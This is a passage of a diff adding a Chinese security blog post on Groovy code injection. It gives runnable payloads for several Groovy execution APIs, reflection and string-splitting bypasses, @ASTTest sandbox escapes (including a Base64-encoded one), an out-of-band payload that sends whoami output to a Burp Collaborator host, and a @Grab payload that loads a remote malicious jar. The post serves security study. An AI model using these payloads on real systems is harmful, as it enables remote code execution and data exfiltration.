<span class="variable">groovyScriptEngine2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">GroovyScriptEngine</span>(<span class="string">&quot;&quot;</span>);</span><br><span class="line">        groovyScriptEngine2.run(<span class="string">&quot;src/main/java/org/example/deserialize/groovy/exec.groovy&quot;</span>, <span class="keyword">new</span> <span class="title class_">Binding</span>());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h4 id="GroovyScriptEvaluator"><a href="#GroovyScriptEvaluator" class="headerlink" title="GroovyScriptEvaluator"></a>GroovyScriptEvaluator</h4><p>GroovyScriptEvaluator#evaluate方法同样可以执行Groovy代码，本质还是GroovyShell，但是evaluate参数需要是org.springframework.scripting.ScriptSource接口的对象。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example.deserialize.groovy;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.core.io.UrlResource;</span><br><span class="line"><span class="keyword">import</span> org.springframework.scripting.groovy.GroovyScriptEvaluator;</span><br><span class="line"><span class="keyword">import</span> org.springframework.scripting.support.ResourceScriptSource;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">GroovyUsage3</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">UrlResource</span> <span class="variable">urlResource</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">UrlResource</span>(<span class="string">&quot;http://127.0.0.1:8888/exec.groovy&quot;</span>);</span><br><span class="line">        <span class="type">ResourceScriptSource</span> <span class="variable">resourceScriptSource</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ResourceScriptSource</span>(urlResource);</span><br><span class="line">        <span class="type">GroovyScriptEvaluator</span> <span class="variable">groovyScriptEvaluator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">GroovyScriptEvaluator</span>();</span><br><span class="line">        groovyScriptEvaluator.evaluate(resourceScriptSource);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h4 id="GroovyClassLoader"><a href="#GroovyClassLoader" class="headerlink" title="GroovyClassLoader"></a>GroovyClassLoader</h4><p>GroovyClassLoader是一个定制的类装载器，负责解释加载Java类中用到的Groovy类，重写了loadClass和defineClass方法，parseClass可以直接从文件或者字符串中获取Groovy类。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example.deserialize.groovy;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> groovy.lang.GroovyClassLoader;</span><br><span class="line"><span class="keyword">import</span> groovy.lang.GroovyObject;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">GroovyUsage4</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">// 从文件中获取Groovy类</span></span><br><span class="line">        <span class="type">GroovyClassLoader</span> <span class="variable">groovyClassLoader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">GroovyClassLoader</span>();</span><br><span class="line">        <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> groovyClassLoader.parseClass(<span class="keyword">new</span> <span class="title class_">File</span>(<span class="string">&quot;src/main/java/org/example/deserialize/groovy/exec.groovy&quot;</span>));</span><br><span class="line">        <span class="type">GroovyObject</span> <span class="variable">object</span> <span class="operator">=</span> (GroovyObject) clazz.newInstance();</span><br><span class="line">        object.invokeMethod(<span class="string">&quot;main&quot;</span>, <span class="string">&quot;&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 从文本中获取Groovy类</span></span><br><span class="line">        <span class="type">GroovyClassLoader</span> <span class="variable">groovyClassLoader1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">GroovyClassLoader</span>();</span><br><span class="line">        <span class="type">Class</span> <span class="variable">aClass</span> <span class="operator">=</span> groovyClassLoader1.parseClass(<span class="string">&quot;class GroovyTest &#123;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;    static void main(args)&#123;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;        println \&quot;$&#123;&#x27;whoami&#x27;.execute().text&#125;\&quot;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;    &#125;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;&#125;&quot;</span>);</span><br><span class="line">        <span class="type">GroovyObject</span> <span class="variable">groovyObject</span> <span class="operator">=</span> (GroovyObject) aClass.newInstance();</span><br><span class="line">        groovyObject.invokeMethod(<span class="string">&quot;main&quot;</span>, <span class="string">&quot;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h4 id="ScriptEngine"><a href="#ScriptEngine" class="headerlink" title="ScriptEngine"></a>ScriptEngine</h4><p>ScriptEngine脚本引擎是被设计为用于数据交换和脚本执行的。ScriptEngineManager类是一个脚本引擎的管理类，用来创建脚本引擎，大概的方式就是在类加载的时候通过SPI的方式，扫描ClassPath中已经包含实现的所有ScriptEngineFactory，载入后用来负责生成具体的ScriptEngine。</p>
+<p>在ScriptEngine中，支持名为groovy的引擎，可用来执行Groovy代码。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example.deserialize.groovy;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.script.ScriptEngine;</span><br><span class="line"><span class="keyword">import</span> javax.script.ScriptEngineManager;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">GroovyUsage5</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"><span class="comment">//        ScriptEngine scriptEngine = new ScriptEngineManager().getEngineByName(&quot;groovy&quot;);</span></span><br><span class="line">        <span class="type">ScriptEngine</span> <span class="variable">scriptEngine</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ScriptEngineManager</span>().getEngineByExtension(<span class="string">&quot;groovy&quot;</span>);</span><br><span class="line">        scriptEngine.eval(<span class="string">&quot;\&quot;open -a Calculator\&quot;.execute().text&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="Bypass"><a href="#Bypass" class="headerlink" title="Bypass"></a>Bypass</h3><h4 id="反射机制-字符串拼接"><a href="#反射机制-字符串拼接" class="headerlink" title="反射机制+字符串拼接"></a>反射机制+字符串拼接</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example.deserialize.groovy;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Bypass1</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Class&lt;?&gt; clazz = Class.forName(<span class="string">&quot;jav&quot;</span> + <span class="string">&quot;a.la&quot;</span> + <span class="string">&quot;ng.Run&quot;</span> + <span class="string">&quot;time&quot;</span>);</span><br><span class="line">        <span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> clazz.getMethod(<span class="string">&quot;ge&quot;</span> + <span class="string">&quot;tRu&quot;</span> + <span class="string">&quot;ntime&quot;</span>);</span><br><span class="line">        <span class="type">Method</span> <span class="variable">method1</span> <span class="operator">=</span> clazz.getMethod(<span class="string">&quot;ex&quot;</span> + <span class="string">&quot;ec&quot;</span>, String.class);</span><br><span class="line">        method1.invoke(method.invoke(<span class="literal">null</span>), <span class="string">&quot;ope&quot;</span> + <span class="string">&quot;n -a&quot;</span> + <span class="string">&quot; Calcu&quot;</span> + <span class="string">&quot;lator&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h4 id="Groovy沙箱绕过"><a href="#Groovy沙箱绕过" class="headerlink" title="Groovy沙箱绕过"></a>Groovy沙箱绕过</h4><p>Groovy代码注入都是注入了execute方法，从而能够成功执行Groovy代码。但是当存在Groovy沙箱（Jenkins中执行存在Groovy沙箱），即只进行AST解析无调用或限制execute方法的情况下就需要用到其他技巧了。参考Groovy的<a target="_blank" rel="noopener" href="http://groovy-lang.org/metaprogramming.html">Meta Programming手册</a>，利用AST注解能够执行断言从而实现代码执行。</p>
+<ul>
+<li>@AST注解执行断言：利用AST注解能够执行断言从而实现代码执行</li>
+</ul>
+<figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example.deserialize.groovy</span><br><span class="line"></span><br><span class="line"><span class="comment">// @AST注解执行断言</span></span><br><span class="line"><span class="variable language_">this</span>.<span class="keyword">class</span>.classLoader.parseClass(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    @groovy.transform.ASTTest(value=&#123;</span></span><br><span class="line"><span class="string">        assert Runtime.getRuntime().exec(&quot;open -a Calculator&quot;)</span></span><br><span class="line"><span class="string">    &#125;)</span></span><br><span class="line"><span class="string">    def x</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">// OOB</span></span><br><span class="line"><span class="meta">@groovy</span>.transform.ASTTest(value=&#123;</span><br><span class="line">    cmd = <span class="string">&quot;whoami&quot;</span>;</span><br><span class="line">    out = <span class="keyword">new</span> java.util.Scanner(java.lang.Runtime.getRuntime().exec(cmd.split(<span class="string">&quot; &quot;</span>)).getInputStream()).useDelimiter(<span class="string">&quot;\\A&quot;</span>).next()</span><br><span class="line">    cmd2 = <span class="string">&quot;ping &quot;</span> + out.replaceAll(<span class="string">&quot;[^a-zA-Z0-9]&quot;</span>,<span class="string">&quot;&quot;</span>) + <span class="string">&quot;.cq6qwx76mos92gp9eo7746dmgdm5au.burpcollaborator.net&quot;</span>;</span><br><span class="line">    java.lang.Runtime.getRuntime().exec(cmd2.split(<span class="string">&quot; &quot;</span>))</span><br><span class="line">&#125;)</span><br><span class="line"><span class="keyword">def</span> x</span><br><span class="line"></span><br><span class="line"><span class="comment">// Base64编码</span></span><br><span class="line"><span class="variable language_">this</span>.evaluate(<span class="keyword">new</span> String(java.util.Base64.getDecoder().decode(<span class="string">&quot;QGdyb292eS50cmFuc2Zvcm0uQVNUVGVzdCh2YWx1ZT17CiAgICBhc3NlcnQgUnVudGltZS5nZXRSdW50aW1lKCkuZXhlYygib3BlbiAtYSBDYWxjdWxhdG9yIikKfSkKZGVmIHg=&quot;</span>)))</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>@Grab注解加载远程恶意类：Grape是Groovy内建的一个动态jar依赖管理程序，允许开发者动态引入不在ClassPath中的函式库。编写恶意EXP类，命令执行代码写在其构造函数中，然后编译成jar包即可，请求远程恶意jar包并导入恶意EXP类执行其构造函数，从而导致RCE。</li>
+</ul>
+<figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//@Grab注解加载远程恶意类</span></span><br><span class="line"><span class="variable language_">this</span>.<span class="keyword">class</span>.classLoader.parseClass(<span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    @GrabConfig(disableChecksums=true)</span></span><br><span class="line"><span class="string">    @GrabResolver(name=&quot;Poc&quot;, root=&quot;http://127.0.0.1:8888/&quot;)</span></span><br><span class="line"><span class="string">    @Grab(group=&quot;Poc&quot;, module=&quot;EvilJar&quot;, version=&quot;0&quot;)</span></span><br><span class="line"><span class="string">    import java.lang.String</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span>);</span><br></pre></td></tr></table></figure>
+
+
+
+
+  </div>
+</article>
+
+
+    <div class="blog-post-comments">
+        <div id="utterances_thread">
+            <noscript>Please enable JavaScript to view the comments.</noscript>
+        </div>
+    </div>
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/archives/">Writing</a></li>
+        
+          <li><a href="/tags/">Tag</a></li>
+        
+          <li><a href="/search/">Search</a></li>
+        
+          <li><a href="/about/">About</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86"><span class="toc-number">2.</span> <span class="toc-text">前置知识</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#MethodClosure"><span class="toc-number">2.1.</span> <span class="toc-text">MethodClosure</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#String-execute"><span class="toc-number">2.2.</span> <span class="toc-text">String.execute</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ConvertedClosure"><span class="toc-number">2.3.</span> <span class="toc-text">ConvertedClosure</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%9E%84%E9%80%A0"><span class="toc-number">3.</span> <span class="toc-text">利用构造</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5"><span class="toc-number">4.</span> <span class="toc-text">命令注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86"><span class="toc-number">4.1.</span> <span class="toc-text">漏洞原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-number">4.2.</span> <span class="toc-text">漏洞利用</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#CroovyShell"><span class="toc-number">4.2.1.</span> <span class="toc-text">CroovyShell</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#GroovyScriptEngine"><span class="toc-number">4.2.2.</span> <span class="toc-text">GroovyScriptEngine</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#GroovyScriptEvaluator"><span class="toc-number">4.2.3.</span> <span class="toc-text">GroovyScriptEvaluator</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#GroovyClassLoader"><span class="toc-number">4.2.4.</span> <span class="toc-text">GroovyClassLoader</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#ScriptEngine"><span class="toc-number">4.2.5.</span> <span class="toc-text">ScriptEngine</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Bypass"><span class="toc-number">4.3.</span> <span class="toc-text">Bypass</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6-%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%8B%BC%E6%8E%A5"><span class="toc-number">4.3.1.</span> <span class="toc-text">反射机制+字符串拼接</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Groovy%E6%B2%99%E7%AE%B1%E7%BB%95%E8%BF%87"><span class="toc-number">4.3.2.</span> <span class="toc-text">Groovy沙箱绕过</span></a></li></ol></li></ol></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://h3rmesk1t.github.io/2023/10/01/Groovy/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://h3rmesk1t.github.io/2023/10/01/Groovy/&text=Groovy"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://h3rmesk1t.github.io/2023/10/01/Groovy/&title=Groovy"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://h3rmesk1t.github.io/2023/10/01/Groovy/&is_video=false&description=Groovy"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Groovy&body=Check out this article: https://h3rmesk1t.github.io/2023/10/01/Groovy/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://h3rmesk1t.github.io/2023/10/01/Groovy/&title=Groovy"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://h3rmesk1t.github.io/2023/10/01/Groovy/&title=Groovy"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://h3rmesk1t.github.io/2023/10/01/Groovy/&title=Groovy"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://h3rmesk1t.github.io/2023/10/01/Groovy/&title=Groovy"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://h3rmesk1t.github.io/2023/10/01/Groovy/&name=Groovy&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://h3rmesk1t.github.io/2023/10/01/Groovy/&t=Groovy"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+      <div class="footer-left">
+        Copyright &copy;
+        
+        
+        2023-2025
+        H3rmesk1t
+      </div>
+      <div class="footer-right">
+        <nav>
+          <ul>
+            <!--
+          --><li><a href="/">Home</a></li><!--
+        --><!--
+          --><li><a href="/archives/">Writing</a></li><!--
+        --><!--
+          --><li><a href="/tags/">Tag</a></li><!--
+        --><!--
+          --><li><a href="/search/">Search</a></li><!--
+        --><!--
+          --><li><a href="/about/">About</a></li><!--
+        -->
+          </ul>
+          <ul>
+            
+              <!-- 不蒜子统计 -->
+              <span id="busuanzi_container_site_pv">
+                  本站总访问量<span id="busuanzi_value_site_pv"></span>次
+              </span>
+              <span class="post-meta-divider">|</span>
+              <span id="busuanzi_container_site_uv" style='display:none'>
+                      本站访客数<span id="busuanzi_value_site_uv"></span>人
+              </span>
+            <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+            
+          </ul>
+        </nav>
+      </div>
+      
+</footer>
+
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+    <script type="text/javascript">
+      var utterances_repo = 'H3rmesk1t/h3rmesk1t.github.io';
+      var utterances_issue_term = 'pathname';
+      var utterances_label = '💬';
+      var utterances_theme = 'github-light';
+
+      (function(){
+          var script = document.createElement('script');
+
+          script.src = 'https://utteranc.es/client.js';
+          script.setAttribute('repo', utterances_repo);
+          script.setAttribute('issue-term', 'pathname');
+          script.setAttribute('label', utterances_label);
+          script.setAttribute('theme', utterances_theme);
+          script.setAttribute('crossorigin', 'anonymous');
+          script.async = true;
+          (document.getElementById('utterances_thread')).appendChild(script);
+      }());
+  </script>
+
+</body>
+</html>
